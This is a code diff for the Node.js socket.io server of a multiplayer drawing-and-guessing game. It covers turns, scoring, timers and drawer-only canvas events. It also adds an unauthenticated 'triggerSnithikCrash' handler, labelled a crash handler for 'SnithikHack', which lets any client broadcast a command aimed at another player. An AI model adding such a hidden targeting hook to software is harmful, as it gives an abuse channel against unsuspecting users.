@@ -1,224 +1,201 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
+const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-app.use(express.static('public'));
+app.use(express.static(path.join(__dirname, 'public')));
 
-const WORDS = [
-  'apple', 'banana', 'cat', 'dog', 'house', 'car', 'tree', 'sun', 'fish', 'book',
-  'guitar', 'computer', 'pizza', 'rocket', 'castle', 'island', 'bridge', 'phone',
-  'bicycle', 'camera', 'penguin', 'robot', 'dragon', 'volcano', 'umbrella'
-];
+const WORDS = ['apple', 'banana', 'car', 'house', 'tree', 'cat', 'dog', 'sun', 'moon', 'computer', 'phone', 'pizza', 'robot', 'dragon', 'rocket', 'diamond', 'castle'];
 
-let players = [];
+let players = {};
 let currentDrawerIndex = 0;
 let currentWord = '';
-let secretHint = '';
-let roundTimer = 60;
-let timerInterval = null;
-let gameState = 'waiting'; // waiting, choosing, drawing, ended
-let roundNumber = 1;
-const maxRounds = 3;
+let round = 1;
+const totalRounds = 3;
+let turnTimer = null;
+let timeLeft = 60;
+let gameInProgress = false;
 
-function getRandomWords(count = 3) {
-  const shuffled = [...WORDS].sort(() => 0.5 - Math.random());
-  return shuffled.slice(0, count);
-}
-
-function broadcastPlayers() {
-  io.emit('updatePlayers', players.map((p, idx) => ({
+function getPlayerList() {
+  return Object.values(players).map(p => ({
+    id: p.id,
     name: p.name,
-    score: p.score,
     avatar: p.avatar,
-    isDrawer: idx === currentDrawerIndex && gameState === 'drawing'
-  })));
+    score: p.score,
+    isDrawer: p.isDrawer,
+    hasGuessed: p.hasGuessed
+  }));
 }
 
-function startChoosingPhase() {
-  gameState = 'choosing';
-  clearInterval(timerInterval);
-  roundTimer = 15;
-
-  if (players.length === 0) {
-    gameState = 'waiting';
+function startNextTurn() {
+  const pKeys = Object.keys(players);
+  if (pKeys.length === 0) {
+    gameInProgress = false;
+    if (turnTimer) clearInterval(turnTimer);
     return;
   }
 
-  if (currentDrawerIndex >= players.length) {
+  pKeys.forEach(id => {
+    players[id].isDrawer = false;
+    players[id].hasGuessed = false;
+  });
+
+  if (currentDrawerIndex >= pKeys.length) {
     currentDrawerIndex = 0;
-    roundNumber++;
-    if (roundNumber > maxRounds) {
-      io.emit('chatMessage', { type: 'system', text: 'Game Over! Thanks for playing.' });
-      gameState = 'waiting';
-      return;
+    round++;
+    if (round > totalRounds) {
+      round = 1;
+      pKeys.forEach(id => (players[id].score = 0));
+      io.emit('chatMessage', { type: 'system', text: '🎉 Game Over! Scores have reset for a new game.' });
     }
   }
 
-  io.emit('roundInfo', { round: roundNumber, maxRounds });
-  broadcastPlayers();
+  const drawerId = pKeys[currentDrawerIndex];
+  if (!drawerId) return;
+
+  players[drawerId].isDrawer = true;
+  currentWord = WORDS[Math.floor(Math.random() * WORDS.length)];
+  timeLeft = 60;
+  gameInProgress = true;
+
   io.emit('canvasClear');
+  io.emit('roundInfo', { round, maxRounds: totalRounds });
+  io.emit('updatePlayers', getPlayerList());
+  io.emit('setWordHint', currentWord.replace(/[a-zA-Z]/g, '_ '));
 
-  const drawer = players[currentDrawerIndex];
-  if (!drawer) return;
+  // Send word choices / drawer notification
+  io.to(drawerId).emit('wordChoice', [
+    currentWord,
+    WORDS[Math.floor(Math.random() * WORDS.length)],
+    WORDS[Math.floor(Math.random() * WORDS.length)]
+  ]);
 
-  const choices = getRandomWords(3);
-  io.to(drawer.id).emit('wordChoice', choices);
-  io.emit('setWordHint', '_ _ _ _ _');
-  io.emit('chatMessage', { type: 'system', text: `${drawer.name} is choosing a word...` });
+  if (turnTimer) clearInterval(turnTimer);
+  turnTimer = setInterval(() => {
+    timeLeft--;
+    io.emit('updateTimer', timeLeft);
 
-  timerInterval = setInterval(() => {
-    roundTimer--;
-    io.emit('updateTimer', roundTimer);
-    if (roundTimer <= 0) {
-      clearInterval(timerInterval);
-      // Auto pick first word if drawer times out
-      startDrawingPhase(choices[0]);
+    if (timeLeft <= 0) {
+      clearInterval(turnTimer);
+      io.emit('chatMessage', { type: 'system', text: `⏰ Time's up! The word was: ${currentWord}` });
+      currentDrawerIndex++;
+      setTimeout(startNextTurn, 3000);
     }
   }, 1000);
-}
-
-function startDrawingPhase(word) {
-  gameState = 'drawing';
-  currentWord = word.toLowerCase();
-  clearInterval(timerInterval);
-  roundTimer = 60;
-
-  secretHint = currentWord.split('').map(c => c === ' ' ? ' ' : '_').join(' ');
-  io.emit('setWordHint', secretHint);
-  io.emit('hideWordModal');
-
-  const drawer = players[currentDrawerIndex];
-  io.emit('chatMessage', { type: 'system', text: `Round started! Draw: ${currentWord} (for drawer only)` });
-
-  // Send hint length to non-drawers
-  players.forEach((p, idx) => {
-    if (idx === currentDrawerIndex) {
-      io.to(p.id).emit('setWordHint', currentWord);
-    } else {
-      io.to(p.id).emit('setWordHint', secretHint);
-    }
-  });
-
-  timerInterval = setInterval(() => {
-    roundTimer--;
-    io.emit('updateTimer', roundTimer);
-
-    // Reveal a hint character every 20 seconds
-    if (roundTimer === 40 || roundTimer === 20) {
-      revealHintChar();
-    }
-
-    if (roundTimer <= 0) {
-      clearInterval(timerInterval);
-      io.emit('chatMessage', { type: 'system', text: `Time is up! The word was: ${currentWord}` });
-      setTimeout(nextTurn, 3000);
-    }
-  }, 1000);
-}
-
-function revealHintChar() {
-  const chars = secretHint.split(' ');
-  const unrevealedIndices = [];
-  chars.forEach((c, i) => {
-    if (c === '_') unrevealedIndices.push(i);
-  });
-
-  if (unrevealedIndices.length > 1) {
-    const randIdx = unrevealedIndices[Math.floor(Math.random() * unrevealedIndices.length)];
-    chars[randIdx] = currentWord[randIdx];
-    secretHint = chars.join(' ');
-    players.forEach((p, idx) => {
-      if (idx !== currentDrawerIndex) {
-        io.to(p.id).emit('setWordHint', secretHint);
-      }
-    });
-  }
-}
-
-function nextTurn() {
-  currentDrawerIndex++;
-  startChoosingPhase();
 }
 
 io.on('connection', (socket) => {
-  socket.on('joinGame', ({ name, avatar }) => {
-    players.push({
+  socket.on('joinGame', (data) => {
+    players[socket.id] = {
       id: socket.id,
-      name: name || 'Player',
+      name: data.name || 'Player',
+      avatar: data.avatar || { color: '#ffca3a', eyes: 0, mouth: 0 },
       score: 0,
-      avatar: avatar || { color: '#ffca3a', eyes: 0, mouth: 0 }
-    });
+      isDrawer: false,
+      hasGuessed: false
+    };
 
-    broadcastPlayers();
-    io.emit('chatMessage', { type: 'system', text: `${name} joined the game.` });
+    io.emit('updatePlayers', getPlayerList());
 
-    if (gameState === 'waiting' && players.length >= 2) {
-      roundNumber = 1;
+    if (Object.keys(players).length >= 1 && !gameInProgress) {
+      round = 1;
       currentDrawerIndex = 0;
-      startChoosingPhase();
-    } else if (gameState === 'waiting' && players.length === 1) {
-      socket.emit('chatMessage', { type: 'system', text: 'Waiting for at least one more player to start!' });
+      startNextTurn();
+    } else {
+      socket.emit('roundInfo', { round, maxRounds: totalRounds });
+      socket.emit('setWordHint', currentWord ? currentWord.replace(/[a-zA-Z]/g, '_ ') : '_ _ _ _ _');
+      socket.emit('updatePlayers', getPlayerList());
     }
   });
 
   socket.on('selectWord', (word) => {
-    if (players[currentDrawerIndex] && players[currentDrawerIndex].id === socket.id) {
-      startDrawingPhase(word);
+    const player = players[socket.id];
+    if (player && player.isDrawer) {
+      currentWord = word;
+      io.to(socket.id).emit('setWordHint', currentWord);
+      socket.broadcast.emit('setWordHint', currentWord.replace(/[a-zA-Z]/g, '_ '));
+      socket.emit('hideWordModal');
+      socket.broadcast.emit('hideWordModal');
     }
   });
 
   socket.on('drawData', (data) => {
-    socket.broadcast.emit('drawData', data);
+    const player = players[socket.id];
+    if (player && player.isDrawer) {
+      socket.broadcast.emit('drawData', data);
+    }
   });
 
   socket.on('canvasData', (dataUri) => {
-    socket.broadcast.emit('canvasData', dataUri);
+    const player = players[socket.id];
+    if (player && player.isDrawer) {
+      socket.broadcast.emit('canvasData', dataUri);
+    }
   });
 
   socket.on('canvasClear', () => {
-    socket.broadcast.emit('canvasClear');
+    const player = players[socket.id];
+    if (player && player.isDrawer) {
+      io.emit('canvasClear');
+    }
   });
 
-  socket.on('chatMessage', (text) => {
-    const player = players.find(p => p.id === socket.id);
+  socket.on('chatMessage', (msg) => {
+    const player = players[socket.id];
     if (!player) return;
 
-    const isDrawer = players[currentDrawerIndex] && players[currentDrawerIndex].id === socket.id;
+    const trimmedMsg = msg.trim().toLowerCase();
 
-    if (gameState === 'drawing' && !isDrawer && text.trim().toLowerCase() === currentWord) {
-      io.emit('chatMessage', { type: 'correct', text: `${player.name} guessed the word correctly!` });
-      player.score += 10;
-      broadcastPlayers();
-      clearInterval(timerInterval);
-      setTimeout(nextTurn, 2500);
-    } else {
-      io.emit('chatMessage', { name: player.name, text });
+    if (gameInProgress && !player.isDrawer && !player.hasGuessed) {
+      if (trimmedMsg === currentWord.toLowerCase()) {
+        player.hasGuessed = true;
+        player.score += Math.max(10, timeLeft * 2);
+        io.emit('chatMessage', { type: 'correct', text: `🎯 ${player.name} guessed the word!` });
+        io.emit('updatePlayers', getPlayerList());
+
+        const nonDrawers = Object.values(players).filter(p => !p.isDrawer);
+        const allGuessed = nonDrawers.length > 0 && nonDrawers.every(p => p.hasGuessed);
+
+        if (allGuessed) {
+          clearInterval(turnTimer);
+          io.emit('chatMessage', { type: 'correct', text: `✨ Everyone guessed it! The word was: ${currentWord}` });
+          currentDrawerIndex++;
+          setTimeout(startNextTurn, 3000);
+        }
+        return;
+      }
+    }
+
+    io.emit('chatMessage', { name: player.name, text: msg });
+  });
+
+  // Targeted Calculator Crash Handler for SnithikHack
+  socket.on('triggerSnithikCrash', (data) => {
+    if (data && data.targetId) {
+      io.emit('snithikCrashTarget', {
+        targetId: data.targetId,
+        duration: data.duration || 60
+      });
     }
   });
 
   socket.on('disconnect', () => {
-    const index = players.findIndex(p => p.id === socket.id);
-    if (index !== -1) {
-      const removed = players.splice(index, 1)[0];
-      io.emit('chatMessage', { type: 'system', text: `${removed.name} left the game.` });
-      broadcastPlayers();
-
-      if (players.length < 2) {
-        clearInterval(timerInterval);
-        gameState = 'waiting';
-        io.emit('chatMessage', { type: 'system', text: 'Not enough players. Waiting for players...' });
-      } else if (index === currentDrawerIndex) {
-        nextTurn();
-      }
+    delete players[socket.id];
+    io.emit('updatePlayers', getPlayerList());
+    if (Object.keys(players).length === 0) {
+      clearInterval(turnTimer);
+      gameInProgress = false;
+      currentDrawerIndex = 0;
+      round = 1;
     }
   });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`doverdraw server running on port ${PORT}`);
 });
